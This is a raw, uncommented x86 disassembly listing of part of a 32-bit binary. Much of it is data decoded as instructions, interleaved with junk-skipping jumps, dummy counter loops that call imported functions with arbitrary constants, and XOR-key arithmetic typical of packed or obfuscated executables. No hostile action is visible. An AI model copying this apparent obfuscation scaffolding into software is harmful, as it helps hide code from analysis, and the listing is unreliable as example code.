  40a7f1:	prefetch BYTE PTR [ebx-0x5]
  40a7f5:	sti    
  40a7f6:	retf   0x6c42
  40a7f9:	(bad)  [esi-0x6b259b97]
  40a7ff:	out    0x40,eax
  40a801:	loopne 0x40a7f9
  40a803:	out    0x31,eax
  40a805:	retf   
  40a806:	push   ss
  40a807:	stos   BYTE PTR es:[edi],al
  40a808:	inc    edi
  40a809:	lods   al,BYTE PTR ds:[esi]
  40a80a:	scas   eax,DWORD PTR es:[edi]
  40a80b:	popf   
  40a80c:	mov    ?,WORD PTR [esi-0x679c93ca]
  40a812:	sub    al,0x61
  40a814:	enter  0xb189,0x7f
  40a818:	push   edx
  40a819:	or     eax,0x3cc57d2a
  40a81e:	ret    0x2b62
  40a821:	mov    eax,0xbc856515
  40a826:	(bad)  
  40a827:	push   esp
  40a828:	or     ebp,edx
  40a82a:	inc    esp
  40a82b:	push   eax
  40a82c:	repnz not DWORD PTR [eax+0x5df5ae3b]
  40a833:	fs in  al,0x2b
  40a836:	sub    BYTE PTR es:[esi],0x55
  40a83a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a83b:	jmp    0x2e6bc7ff
  40a840:	stc    
  40a841:	and    ecx,esp
  40a843:	psubsb mm0,mm6
  40a846:	push   0x31
  40a848:	gs scas eax,DWORD PTR es:[edi]
  40a84a:	imul   DWORD PTR [esi]
  40a84c:	(bad)  
  40a84d:	fcomip st,st(3)
  40a84f:	loopne 0x40a7e1
  40a851:	aad    0x6c
  40a853:	lods   al,BYTE PTR ds:[esi]
  40a854:	scas   eax,DWORD PTR es:[edi]
  40a855:	mov    ch,0xfd
  40a857:	lds    eax,FWORD PTR [ebp-0x11]
  40a85a:	jg     0x40a87d
  40a85c:	jle    0x40a87c
  40a85e:	aas    
  40a85f:	dec    esi
  40a861:	pop    ebp
  40a862:	dec    ecx
  40a863:	in     al,0x53
  40a865:	push   0x1aa03062
  40a86a:	push   cs
  40a86b:	push   esp
  40a86c:	pop    ss
  40a86d:	sbb    BYTE PTR [ebx+ebx*4+0x28f9dd3f],dh
  40a874:	and    ecx,DWORD PTR [edi+0x66]
  40a877:	lods   eax,DWORD PTR ds:[esi]
  40a878:	loopne 0x40a890
  40a87a:	es xor al,0x96
  40a87d:	repz inc edi
  40a87f:	sub    al,0x9d
  40a881:	fsubr  st,st(3)
  40a883:	mov    ds:0x352f399,eax
  40a888:	xor    BYTE PTR [edi],al
  40a88a:	dec    ebp
  40a88b:	repz sub DWORD PTR [ebp+0x5e518b1],edx
  40a892:	int    0x21
  40a894:	cmp    cl,BYTE PTR [edi-0x74aa134f]
  40a89a:	xor    DWORD PTR [ebx-0x1e],0x74636852
  40a8a1:	loope  0x40a8db
  40a8a3:	gs aaa 
  40a8a5:	loope  0x40a877
  40a8a7:	jecxz  0x40a8d2
  40a8a9:	sbb    dh,BYTE PTR [ebp+0x75]
  40a8ac:	xor    edx,eax
  40a8ae:	and    ah,BYTE PTR [ebp-0x79c7c328]
  40a8b4:	ror    DWORD PTR [esp+esi*4+0xf42f48a],cl
  40a8bb:	push   es
  40a8bc:	xlat   BYTE PTR ds:[ebx]
  40a8bd:	js     0x40a889
  40a8bf:	sbb    eax,0xbd4a84c4
  40a8c4:	ror    BYTE PTR [esi-0x6d],1
  40a8c7:	xor    ch,cl
  40a8c9:	dec    ebx
  40a8ca:	push   edx
  40a8cb:	pop    ss
  40a8cc:	mov    al,0xd6
  40a8ce:	sbb    DWORD PTR [ecx+0x41],esi
  40a8d1:	sub    ecx,DWORD PTR ds:0xd7702747
  40a8d7:	iret   
  40a8d8:	fsub   st,st(3)
  40a8da:	adc    ecx,esp
  40a8dc:	inc    edx
  40a8dd:	pop    ds
  40a8de:	dec    esp
  40a8df:	daa    
  40a8e0:	test   BYTE PTR ds:0x91992763,al
  40a8e6:	and    edx,ebx
  40a8e8:	imul   DWORD PTR [edx-0x37]
  40a8eb:	fnstcw WORD PTR [ecx+0x1]
  40a8ee:	mov    esi,0xccfbd4e6
  40a8f3:	xchg   BYTE PTR [edi-0x629d06b0],ah
  40a8f9:	mov    eax,ds:0xb8e8369d
  40a8fe:	jge    0x40a943
  40a900:	pop    edi
  40a901:	sbb    dx,bp
  40a904:	xchg   DWORD PTR [ebx+ebp*1-0x36],ecx
  40a908:	mov    al,ds:0x2e0ef95e
  40a90d:	sbb    cl,BYTE PTR [edi-0x421fb77]
  40a913:	sti    
  40a914:	mul    DWORD PTR [edi+ebp*4+0x20]
  40a918:	popf   
  40a919:	mov    edx,0xfc458be5
  40a91e:	push   esi
  40a91f:	or     DWORD PTR ds:0x41aa52,edx
  40a925:	mov    esi,DWORD PTR [ebp-0x8]
  40a928:	and    DWORD PTR ds:0x412300,0x0
  40a932:	mov    ecx,DWORD PTR ds:0x412300
  40a938:	inc    ecx
  40a939:	mov    DWORD PTR ds:0x412300,ecx
  40a93f:	cmp    DWORD PTR ds:0x412300,0x26
  40a946:	jne    0x40a962
  40a94c:	push   DWORD PTR [ebp-0x14]
  40a94f:	push   DWORD PTR [ebp-0x24]
  40a952:	push   0x8e18
  40a957:	push   0x31c8
  40a95c:	call   DWORD PTR ds:0x40d024
  40a962:	cmp    DWORD PTR ds:0x412300,0x1b
  40a969:	jb     0x40a932
  40a96f:	mov    edx,0x7510859
  40a974:	xor    eax,edx
  40a976:	xor    esi,edx
  40a978:	mov    ecx,0x32729f
  40a97d:	add    esi,ecx
  40a97f:	add    eax,ecx
  40a981:	imul   eax,esi
  40a984:	mov    esi,DWORD PTR [ebp+0xc]
  40a987:	cmp    esi,eax
  40a989:	jne    0x40ac95
  40a98f:	mov    eax,DWORD PTR [ebp-0x4]
  40a992:	mov    esi,DWORD PTR [ebp-0x8]
  40a995:	jmp    0x40ab0d
  40a99a:	addr16 jno 0x40a945
  40a99d:	mov    ds:0xc965bb78,eax
  40a9a2:	jl     0x40a9a2
  40a9a4:	arpl   bx,dx
  40a9a6:	es stc 
  40a9a8:	sbb    esp,0xffffffe0
  40a9ab:	cmp    bh,BYTE PTR [esi+0x7e]
  40a9ae:	lds    edi,FWORD PTR [edi+0x7e]
  40a9b1:	jle    0x40aa31
  40a9b3:	outs   dx,DWORD PTR ds:[esi]
  40a9b4:	stos   BYTE PTR es:[edi],al
  40a9b5:	cld    
  40a9b6:	push   es
  40a9b7:	mov    ch,BYTE PTR [edx+0x7bab5326]
  40a9bd:	mov    ebx,0x73e02b80
  40a9c2:	call   0x770a:0x57a5d4c
  40a9c9:	pushf  
  40a9ca:	mov    BYTE PTR [edx+0xa],ch
  40a9cd:	nop
  40a9ce:	sahf   
  40a9cf:	inc    ebp
  40a9d0:	jecxz  0x40aa3a
  40a9d2:	sub    ch,BYTE PTR [edx+0x1d9ded93]
  40a9d8:	xor    eax,0x7e035d90
  40a9dd:	shl    DWORD PTR [edx+ecx*4+0x62bc86b2],1
  40a9e4:	push   eax
  40a9e5:	les    esp,FWORD PTR [ecx]
  40a9e7:	repnz mov dl,0x21
  40a9ea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a9eb:	lods   al,BYTE PTR ds:[esi]
  40a9ec:	(bad)  [ebx]
  40a9ee:	ret    
  40a9ef:	push   fs
  40a9f1:	lds    eax,FWORD PTR [ecx-0x5a]
  40a9f4:	dec    ebp
  40a9f5:	pop    edi
  40a9f6:	retf   0xa48c
  40a9f9:	and    esi,DWORD PTR [ebx]
  40a9fb:	leave  
  40a9fc:	imul   edi,DWORD PTR [edi-0x7d],0x6ef5d6d7
  40aa03:	xchg   esp,eax
  40aa04:	imul   ebx,esp,0xffffffe1
  40aa07:	jge    0x40aa48
  40aa09:	pop    eax
  40aa0a:	stos   BYTE PTR es:[edi],al
  40aa0b:	cmp    al,0x39
  40aa0d:	imul   esi,DWORD PTR [esp+esi*4+0x1d],0x925777ce
  40aa15:	mov    eax,0x45629b3
  40aa1a:	cli    
  40aa1b:	xchg   esi,eax
  40aa1c:	imul   ebx,DWORD PTR [ebp-0x4b565b41],0x15
  40aa23:	dec    DWORD PTR [eax]
  40aa25:	dec    edi
  40aa26:	adc    ecx,ebp
  40aa28:	call   0x310a1501
  40aa2d:	mov    ebx,DWORD PTR [edx+0x827b373]
  40aa33:	jle    0x40aa23
  40aa35:	push   ebp
  40aa36:	ins    DWORD PTR es:[edi],dx
  40aa37:	cmp    al,0xd5
  40aa39:	outs   dx,BYTE PTR ds:[esi]
  40aa3a:	je     0x40aaa5
  40aa3c:	xor    BYTE PTR [eax+0x72],0x31
  40aa40:	leave  
  40aa41:	scas   al,BYTE PTR es:[edi]
  40aa42:	int    0xb5
  40aa44:	sub    eax,0x336faf3c
  40aa49:	adc    bh,BYTE PTR [esi-0x30]
  40aa4c:	or     esp,ebx
  40aa4e:	call   0xafd4f63d
  40aa53:	or     dl,BYTE PTR [edi-0x1e]
  40aa56:	sbb    dh,BYTE PTR [edi+0x7faec67]
  40aa5c:	inc    ebp
  40aa5d:	mov    bl,0x37
  40aa5f:	mov    cl,0x95
  40aa61:	pop    ds
  40aa62:	test   BYTE PTR [edx],0x41
  40aa65:	psrad  mm6,QWORD PTR [esi+0x8]
  40aa69:	xchg   BYTE PTR [eax-0x57],dh
  40aa6c:	div    dh
  40aa6e:	daa    
  40aa6f:	inc    esp
  40aa70:	add    esp,edx
  40aa72:	(bad)  [eax-0x27]
  40aa75:	jbe    0x40aa81
  40aa77:	es cld 
  40aa79:	es cmp ch,al
  40aa7c:	lods   al,BYTE PTR ds:[esi]
  40aa7d:	sbb    DWORD PTR [eax+0x70],edi
  40aa80:	adc    DWORD PTR [eax+0x1779a756],edi
  40aa86:	std    
  40aa87:	pushf  
  40aa88:	sbb    DWORD PTR [edi+0x4d],edx
  40aa8b:	js     0x40aaf2
  40aa8d:	jno    0x40aa89
  40aa8f:	lds    eax,FWORD PTR [ecx-0x75]
  40aa92:	loopne 0x40aa92
  40aa94:	adc    BYTE PTR [ecx+ebp*8],bl
  40aa97:	xchg   esi,eax
  40aa98:	adc    al,0xbe
  40aa9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa9b:	out    0x27,eax
  40aa9d:	jg     0x40aa79
  40aa9f:	mov    edx,0x61109398
  40aaa4:	xor    eax,0x6ba0f834
  40aaa9:	push   esp
  40aaaa:	loopne 0x40aa75
  40aaac:	scas   eax,DWORD PTR es:[edi]
  40aaad:	inc    ecx
  40aaae:	xchg   edx,eax
  40aaaf:	push   cs
  40aab0:	mov    esi,ecx
  40aab2:	ja     0x40aa68
  40aab4:	mov    dl,0x9d
  40aab6:	les    eax,FWORD PTR [ebx-0x19777866]
  40aabc:	adc    BYTE PTR [edi+edx*8-0x2e971c7],ah
  40aac3:	lds    esi,FWORD PTR [esi-0x4f]
  40aac6:	mov    edi,edi
  40aac8:	fdiv   st(2),st
  40aaca:	jl     0x40aa9c
  40aacc:	sub    eax,0x891c3c56
  40aad1:	inc    ebp
  40aad2:	mov    ah,0x78
  40aad4:	repz fnstcw WORD PTR [esi+ecx*4-0x106afd84]
  40aadc:	or     BYTE PTR [ebx-0x4ed0db34],ch
  40aae2:	push   0x901a8d3e
  40aae7:	cmp    al,0xf4
  40aae9:	jo     0x40aa88
  40aaeb:	sub    eax,ebx
  40aaed:	pusha  
  40aaee:	mov    dh,0xb8
  40aaf0:	test   al,0x7e
  40aaf2:	jp     0x40ab6d
  40aaf4:	or     esp,DWORD PTR [edi+0x22b511c9]
  40aafa:	adc    BYTE PTR [edx+0x49],ah
  40aafd:	or     al,0x3b
  40aaff:	ficomp WORD PTR [edx+0x1]
  40ab02:	lahf   
  40ab03:	lds    edi,FWORD PTR [esi-0x5b6dcbe8]
  40ab09:	or     al,0x17
  40ab0b:	mov    edi,DWORD PTR [edi]
  40ab0d:	xor    eax,edx
  40ab0f:	xor    esi,edx
  40ab11:	add    eax,ecx
  40ab13:	jmp    0x40ac8b
  40ab18:	jg     0x40aacf
  40ab1a:	add    eax,0x117b453b
  40ab1f:	jns    0x40aab9
  40ab21:	cmp    eax,0xa75bac8b
  40ab26:	jmp    DWORD PTR [esi+0x4f]
  40ab29:	cmp    edi,DWORD PTR [esi+0x7e]
  40ab2c:	lds    edi,FWORD PTR [edi+0x7e]
  40ab2f:	jle    0x40aadb
  40ab31:	leave  
  40ab32:	sub    BYTE PTR [edx],cl
  40ab34:	loop   0x40ab07
  40ab36:	rcr    bh,0xe7
  40ab39:	xchg   edx,eax
  40ab3a:	mov    esp,0x71ab05e4
  40ab3f:	cs es and al,0x46
  40ab43:	jae    0x40aae1
  40ab45:	pop    es
  40ab46:	rcl    BYTE PTR [ecx],cl
  40ab48:	xor    BYTE PTR [eax+edi*1],cl
  40ab4b:	jecxz  0x40aad1
  40ab4d:	(bad)  
  40ab4e:	sub    BYTE PTR [ebx+0x57],al
  40ab51:	pop    ebp
  40ab52:	pop    ss
  40ab53:	mov    dl,0x98
  40ab55:	sbb    esi,DWORD PTR ds:0xe0c6e835
  40ab5b:	dec    ecx
  40ab5c:	push   eax
  40ab5d:	lock jmp 0x40ba7fe9
  40ab63:	ins    BYTE PTR es:[edi],dx
  40ab64:	adc    BYTE PTR [ebx-0x8],al
  40ab67:	xor    al,0xb3
  40ab69:	lods   eax,DWORD PTR ds:[esi]
  40ab6a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab6b:	ins    DWORD PTR es:[edi],dx
  40ab6c:	xor    esi,esi
  40ab6e:	xchg   esp,eax
  40ab6f:	inc    edi
  40ab70:	fbld   TBYTE PTR [ebp+eiz*4+0x6a2ad6fc]
  40ab77:	sahf   
  40ab78:	into   
  40ab79:	sbb    al,0xbb
  40ab7b:	cld    
  40ab7c:	stc    
  40ab7d:	xor    eax,0x2009346c
  40ab82:	push   0xe304628f
  40ab87:	dec    BYTE PTR [esi+0x56878cec]
  40ab8d:	xchg   edi,eax
  40ab8e:	inc    eax
  40ab8f:	jbe    0x40ab18
  40ab91:	ja     0x40abd2
  40ab93:	repnz out dx,eax
  40ab95:	test   edx,edi
  40ab97:	xlat   BYTE PTR ds:[ebx]
  40ab98:	push   ds
  40ab99:	xchg   ebp,edx
  40ab9b:	and    dl,BYTE PTR [esi+0xc520f00]
  40aba1:	mov    DWORD PTR [eax-0x740ad255],esi
  40aba7:	loopne 0x40ab4b
  40aba9:	inc    esp
  40abaa:	or     al,0x30
  40abac:	cmp    DWORD PTR [eax],ebx
  40abae:	and    dl,al
  40abb0:	mov    DWORD PTR [eax-0xc],esp
  40abb3:	and    ebx,DWORD PTR [ecx+0x271aecbe]
  40abb9:	(bad)  
  40abba:	pop    ebx
  40abbb:	xchg   BYTE PTR [ebx-0x24ef9ec8],cl
  40abc1:	inc    esp
  40abc2:	mov    edx,0x4fb95d31
  40abc7:	push   cs
  40abc8:	test   DWORD PTR [edx],ebx
  40abca:	cmp    al,0xb4
  40abcc:	ja     0x40ab50
  40abce:	ins    DWORD PTR es:[edi],dx
  40abcf:	cmp    edx,DWORD PTR [ebx-0x1f35182f]
  40abd5:	loopne 0x40ab6c
  40abd7:	cld    
  40abd8:	ins    DWORD PTR es:[edi],dx
  40abd9:	into   
  40abda:	imul   ebx,DWORD PTR [esi+ebx*4+0x19b0e91c],0xf44099bf
  40abe5:	fidivr WORD PTR [ebp+0x1b926f7f]
  40abeb:	in     eax,0xdb
  40abed:	std    
  40abee:	mov    dl,BYTE PTR [ecx+0x56]
  40abf1:	sbb    bl,BYTE PTR [ecx-0x76cf5afd]
  40abf7:	xchg   ecx,eax
  40abf8:	lods   eax,DWORD PTR fs:[esi]
  40abfa:	leave  
  40abfb:	sbb    al,0xed
  40abfd:	mov    edx,0x18934835
  40ac02:	xor    eax,0x5d7fa326
  40ac07:	pop    ebp
  40ac08:	(bad)  
  40ac09:	jmp    0x15b6710e
  40ac0e:	iret   
  40ac0f:	outs   dx,DWORD PTR ds:[esi]
  40ac10:	pop    es
  40ac11:	cld    
  40ac12:	in     al,dx
  40ac13:	inc    ebp
  40ac14:	sub    ch,BYTE PTR [edi]
  40ac16:	or     eax,DWORD PTR [edi]
  40ac18:	cs dec eax
  40ac1a:	xchg   BYTE PTR [ecx],dh
  40ac1c:	out    dx,al
  40ac1d:	jbe    0x40abc8
  40ac1f:	cmp    bl,BYTE PTR [edx-0xb]
  40ac22:	adc    eax,0xf5350744
  40ac27:	aas    
  40ac28:	cmc    
  40ac29:	arpl   WORD PTR [eax],bx
  40ac2b:	int3   
  40ac2c:	lods   eax,DWORD PTR ds:[esi]
  40ac2d:	push   0xffffffe4
  40ac2f:	pop    ebp
  40ac30:	and    DWORD PTR ds:0x59c98632,ebp
  40ac36:	test   BYTE PTR [edi],ah
  40ac38:	repz ret 0x58bc
  40ac3c:	jo     0x40ac7d
  40ac3e:	pushf  
  40ac3f:	pop    esp
  40ac40:	cli    
  40ac41:	lds    edx,FWORD PTR [ecx+0x3dcbd816]
  40ac47:	or     edi,DWORD PTR [eax-0x7e0e7a56]
  40ac4d:	repnz sbb eax,0x693f92c6
  40ac53:	out    dx,eax
  40ac54:	sbb    esp,edi
  40ac56:	jmp    0xab08:0x978502d0
  40ac5d:	mov    WORD PTR ds:0xb9da06f7,?
  40ac63:	mov    edi,0x3b4bf344
  40ac68:	inc    eax
  40ac69:	adc    DWORD PTR [eax+0x52],eax
  40ac6c:	fs in  al,dx
  40ac6e:	loop   0x40acc5
  40ac70:	sbb    DWORD PTR [esi+0x48b052aa],edx
  40ac76:	add    dh,BYTE PTR [ebp+0x26bc168c]
  40ac7c:	retf   
  40ac7d:	(bad)  
  40ac7e:	and    edi,ebx
  40ac80:	popa   
  40ac81:	aaa    
  40ac82:	push   0x3157a60c
  40ac87:	lds    edx,FWORD PTR [ebx+esi*2+0x4b]
  40ac8b:	add    esi,ecx
  40ac8d:	imul   eax,esi
  40ac90:	jmp    0x40ae48
  40ac95:	mov    eax,DWORD PTR [ebp+0xc]
  40ac98:	mov    eax,DWORD PTR [eax+0x78]
  40ac9b:	mov    DWORD PTR [ebp+0xc],eax
  40ac9e:	mov    eax,DWORD PTR [ebp-0x4]
  40aca1:	mov    esi,DWORD PTR [ebp-0x8]
  40aca4:	xor    eax,edx
  40aca6:	xor    esi,edx
  40aca8:	add    eax,ecx
  40acaa:	jmp    0x40ae22
  40acaf:	push   ss
  40acb0:	mov    esp,0xb169beb3
  40acb5:	sub    edx,DWORD PTR [esp+edx*4-0x31]
  40acb9:	cmc    
  40acba:	sub    ebx,DWORD PTR [ecx+0x2af64090]
  40acc0:	cmp    DWORD PTR [esi+0x7e],edi
  40acc3:	lds    edi,FWORD PTR [edi+0x7e]
  40acc6:	jle    0x40ac8b
  40acc8:	adc    ebp,ebp
  40acca:	inc    eax
  40accb:	dec    eax
  40accc:	and    bh,BYTE PTR [ebp+0x682afeed]
  40acd2:	rol    BYTE PTR [eax],cl
  40acd4:	shl    DWORD PTR [ebp-0x7f],1
  40acd7:	es ins BYTE PTR es:[edi],dx
  40acd9:	lea    ebx,[eax+0x31]
  40acdc:	xchg   esi,eax
  40acdd:	jns    0x40ad4c
  40acdf:	mov    fs,WORD PTR [edi+0x5a]
  40ace2:	lods   eax,DWORD PTR ds:[esi]
  40ace3:	xor    DWORD PTR [edx+0x123edff5],eax
  40ace9:	inc    ebx
  40acea:	mov    bl,0x8d
  40acec:	imul   edi,DWORD PTR [ecx-0x465176e3],0xedce68a
  40acf6:	sti    
  40acf7:	sti    
  40acf8:	lods   al,BYTE PTR ds:[esi]
  40acf9:	bound  ecx,QWORD PTR [esi-0x49]
  40acfc:	cli    
  40acfd:	bound  esi,QWORD PTR [edx+ebp*8-0x526fc089]
  40ad04:	sub    bh,BYTE PTR [edi-0x58]
  40ad07:	jl     0x40aca1
  40ad09:	out    0x2f,al
  40ad0b:	shl    BYTE PTR fs:[edi+0x630c139],cl
  40ad12:	inc    ecx
  40ad13:	repnz call 0xa252:0x565ae3ec
  40ad1b:	in     eax,0x13
  40ad1d:	xchg   edi,eax
  40ad1e:	or     dh,BYTE PTR [ecx]
  40ad20:	xchg   ecx,edx
  40ad22:	xchg   DWORD PTR [esi+0x38],esi
  40ad25:	push   edx
  40ad26:	call   0x8f57a4f0
  40ad2b:	mov    ecx,0xe19bce44
  40ad30:	ret    
  40ad31:	jg     0x40ad56
  40ad33:	add    DWORD PTR [esi],ecx
  40ad35:	lahf   
  40ad36:	sub    esp,esp
  40ad38:	mov    al,0xc
  40ad3a:	fcomp  QWORD PTR [ebx]
  40ad3c:	(bad)  [edi+0x2c376f96]
  40ad42:	mov    dl,0xdc
  40ad44:	dec    eax
  40ad45:	xor    dh,ch
  40ad47:	sbb    eax,0xb2365920
  40ad4c:	dec    esp
  40ad4d:	jmp    0x169b058e
  40ad52:	xor    BYTE PTR [esi+0x621ec57f],ch
  40ad58:	addr16 aad 0xd0
  40ad5b:	cmp    edx,DWORD PTR [ebx]
  40ad5d:	jnp    0x40ad76
  40ad5f:	ror    DWORD PTR [eax],1
  40ad61:	mov    ebx,0x2427abbd
  40ad66:	bound  esp,QWORD PTR [edi+eax*1+0x6e4053df]
  40ad6d:	out    0x48,eax
  40ad6f:	aas    
  40ad70:	jb     0x40ada3
  40ad72:	fidiv  DWORD PTR [edi+0x7e]
  40ad75:	sub    esi,DWORD PTR ds:0xba3c19cd
  40ad7b:	jns    0x40ad80
  40ad7d:	in     al,dx
  40ad7e:	fcom   QWORD PTR [ebp+0x74]
  40ad81:	push   ecx
  40ad82:	or     eax,0x5c82e136
  40ad87:	mov    esi,0x660e503b
  40ad8c:	mov    dh,0x12
  40ad8e:	fistp  WORD PTR fs:[edi]
  40ad91:	leave  
  40ad92:	xchg   ecx,eax
  40ad93:	inc    esp
  40ad94:	rol    ecx,0x48
  40ad97:	xlat   BYTE PTR ds:[ebx]
  40ad98:	jb     0x40adf9
  40ad9a:	sti    
  40ad9b:	sbb    eax,ecx
  40ad9d:	outs   dx,BYTE PTR ds:[esi]
  40ad9e:	fbld   TBYTE PTR [eax]
  40ada0:	fcomp  st(4)
  40ada2:	xor    ecx,DWORD PTR [edx+0x287be53b]
  40ada8:	sbb    esi,edx
  40adaa:	jmp    0xc2ac:0x6aeb3514
  40adb1:	mov    fs,ebx
  40adb3:	mov    ds:0x58810e5c,eax
  40adb8:	in     eax,dx
  40adb9:	mov    esp,0xb1f745af
  40adbe:	test   al,0x29
  40adc0:	lods   al,BYTE PTR ds:[esi]
  40adc1:	ret    
  40adc2:	inc    ebx
  40adc3:	jle    0x40ad9e
  40adc5:	sbb    eax,0x94c4e592
  40adca:	clc    
  40adcb:	sbb    al,0xfb
  40adcd:	xlat   BYTE PTR ds:[ebx]
  40adce:	dec    ebp
  40adcf:	and    eax,0xd62580d5
  40add4:	mov    eax,DWORD PTR [edi]
  40add6:	cdq    
  40add7:	shl    DWORD PTR [ebx],0x1a
  40adda:	cld    
  40addb:	stos   BYTE PTR es:[edi],al
  40addc:	fst    QWORD PTR [ecx-0x19108ed8]
  40ade2:	or     ebp,edx
  40ade4:	out    dx,eax
  40ade5:	jb     0x40ae56
  40ade7:	mov    bh,BYTE PTR ds:0x49041aa
  40aded:	mov    ch,0x73
  40adef:	sti    
  40adf0:	mov    eax,0x982a44ce
  40adf5:	gs das 
  40adf7:	cmc    
  40adf8:	std    
  40adf9:	jmp    0x40ae2d
  40adfb:	push   edi
  40adfc:	aad    0xfa
  40adfe:	iret   
  40adff:	mov    al,ds:0x8861117c
  40ae04:	dec    edx
  40ae05:	in     eax,0xc
  40ae07:	ds mov edi,0x76dd7cfb
  40ae0d:	loope  0x40adf6
  40ae0f:	add    cl,dl
  40ae11:	jbe    0x40ae7b
  40ae13:	test   DWORD PTR [eax-0x22bfc88c],0x68b2e0bd
  40ae1d:	jl     0x40adb6
  40ae1f:	xlat   BYTE PTR ds:[ebx]
  40ae20:	pop    eax
  40ae21:	push   ebx
  40ae22:	add    esi,ecx
  40ae24:	imul   eax,esi
  40ae27:	mov    esi,DWORD PTR [ebp+0xc]
  40ae2a:	cmp    esi,eax
  40ae2c:	mov    eax,DWORD PTR [ebp-0x4]
  40ae2f:	je     0x40a992
  40ae35:	xor    eax,edx
  40ae37:	add    eax,ecx
  40ae39:	mov    ecx,DWORD PTR [ebp+0xc]
  40ae3c:	imul   eax,ecx
  40ae3f:	add    eax,DWORD PTR [ebp+0x8]
  40ae42:	mov    DWORD PTR [ebp+0xc],eax
  40ae45:	mov    eax,DWORD PTR [ebp+0xc]
  40ae48:	pop    esi
  40ae49:	leave  
  40ae4a:	ret    0x8
  40ae4d:	push   ebp
  40ae4e:	mov    ebp,esp
  40ae50:	sub    esp,0x30
  40ae53:	add    DWORD PTR ds:0x41aa3e,0x682
  40ae5d:	mov    DWORD PTR [ebp-0x4],0xf89c8538
  40ae64:	mov    DWORD PTR [ebp-0x18],0xf89c853b
  40ae6b:	dec    DWORD PTR ds:0x41aa4e
  40ae71:	mov    ecx,DWORD PTR [ebp-0x4]
  40ae74:	push   ebx
  40ae75:	mov    eax,0x7510859
  40ae7a:	xor    ebx,0x7bf6
  40ae80:	xor    ecx,eax
  40ae82:	jmp    0x40af67
  40ae87:	je     0x40aef6
  40ae89:	jg     0x40aea2
  40ae8b:	addr16 gs adc al,0x6d
  40ae8f:	test   eax,0xcf268d5d
  40ae94:	dec    esp
  40ae95:	adc    DWORD PTR [ecx+esi*8],ebx
  40ae98:	ds jle 0x40af19
  40ae9b:	mov    dh,0x7e
  40ae9d:	jle    0x40af1d
  40ae9f:	adc    al,BYTE PTR [esi]
  40aea1:	sbb    eax,DWORD PTR [ecx+0x1f]
  40aea4:	loop   0x40aec8
  40aea6:	push   0x293cdad8
  40aeab:	cdq    
  40aeac:	xor    cl,bh
  40aeae:	mov    ds:0x86dfdd58,eax
  40aeb3:	add    al,0x60
  40aeb5:	or     al,0xb6
  40aeb7:	hlt    
  40aeb8:	mov    eax,ds:0x7ff25d41
  40aebd:	(bad)  
  40aebe:	repnz es fs retf 0x51ce
  40aec4:	xor    eax,DWORD PTR [edi+0xb1d4507]
  40aeca:	mov    ds:0xec22194e,al
  40aecf:	pop    esi
  40aed0:	fild   WORD PTR [ebp+0x740517de]
  40aed6:	and    bl,BYTE PTR [edi+0x2554ff00]
  40aedc:	leave  
  40aedd:	pusha  
  40aede:	cdq    
  40aedf:	ja     0x40aea7
  40aee1:	adc    ebp,DWORD PTR ds:0xd7c42007
  40aee7:	mov    bh,0xa1
  40aee9:	xchg   esp,eax
  40aeea:	or     ah,bh
  40aeec:	jnp    0x40af02
  40aeee:	imul   edi,DWORD PTR [esi-0x243ba3a4],0x36e86820
  40aef8:	test   eax,0x8ef835a
  40aefd:	lds    edx,FWORD PTR [ecx+0x265bb79]
  40af03:	(bad)  
  40af06:	dec    ebx
  40af07:	lds    esp,FWORD PTR [edx+edx*8+0x56]
  40af0b:	mov    al,0x7b
  40af0d:	cmc    
  40af0e:	inc    edi
  40af0f:	mov    ebp,ecx
  40af11:	data16 jl 0x40af6a
  40af14:	stos   DWORD PTR es:[edi],eax
  40af15:	aaa    
  40af16:	ret    0xcd70
  40af19:	or     edx,ebp
  40af1b:	dec    ecx
  40af1c:	pop    ebp
  40af1d:	test   edx,eax
  40af1f:	xchg   esp,eax
  40af20:	mov    al,ds:0x5134c725
  40af25:	mov    esp,0x907b7540
  40af2a:	dec    eax
  40af2b:	pop    esi
  40af2c:	sub    eax,0x46945378
  40af31:	inc    ebp
  40af32:	fs stos DWORD PTR es:[edi],eax
  40af34:	cld    
  40af35:	jp     0x40af05
  40af37:	and    dh,cl
  40af39:	int3   
  40af3a:	cli    
  40af3b:	push   ecx
  40af3c:	xor    al,0x23
  40af3e:	jae    0x40af5a
  40af40:	inc    esi
  40af41:	pop    ebp
  40af42:	out    dx,eax
  40af43:	test   eax,0x3ba72df8
  40af48:	push   ds
  40af49:	cmp    esp,DWORD PTR [esi+ecx*1-0x7d]
  40af4d:	into   
  40af4e:	mov    BYTE PTR [edx+0x78],dl
  40af51:	jl     0x40afae
  40af53:	jo     0x40afcc
  40af55:	imul   edi,DWORD PTR [ebp+0x75],0x824f76cc
  40af5c:	cmp    BYTE PTR [esi+0x67d796f],bl
  40af62:	inc    esi
  40af63:	in     eax,0xec
  40af65:	dec    ebx
  40af66:	gs mov ebx,0x32729f
  40af6c:	add    ecx,ebx
  40af6e:	and    DWORD PTR ds:0x412300,0x41aa3e
  40af78:	mov    DWORD PTR [ebp-0x1c],ecx
  40af7b:	mov    DWORD PTR ds:0x4122ec,0x5a41
  40af85:	mov    ecx,DWORD PTR [ebp+0x14]
  40af88:	add    DWORD PTR ds:0x41aa56,0x4122ec
  40af92:	push   esi
  40af93:	push   edi
  40af94:	or     DWORD PTR ds:0x41503d,0x36ef
  40af9e:	test   ecx,ecx
  40afa0:	je     0x40afae
  40afa6:	mov    ecx,DWORD PTR [ebp+0x14]
  40afa9:	mov    ecx,DWORD PTR [ecx]
  40afab:	mov    DWORD PTR [ebp-0x1c],ecx
  40afae:	movzx  edi,BYTE PTR ds:0x417d0d
  40afb5:	and    DWORD PTR ds:0x417d11,edi
  40afbb:	imul   edx,eax
  40afbe:	sub    DWORD PTR ds:0x412304,ecx
  40afc4:	mov    ecx,0x4573
  40afc9:	and    DWORD PTR ds:0x41aa52,0x0
  40afd3:	mov    esi,DWORD PTR ds:0x41aa52
  40afd9:	inc    esi
  40afda:	mov    DWORD PTR ds:0x41aa52,esi
  40afe0:	cmp    DWORD PTR ds:0x41aa52,0x22
  40afe7:	jne    0x40affd
  40afed:	push   0x2695
  40aff2:	push   0x8176
  40aff7:	call   DWORD PTR ds:0x40d3a0
  40affd:	cmp    DWORD PTR ds:0x41aa52,0x1e
  40b004:	jb     0x40afd3
  40b00a:	add    edx,ecx
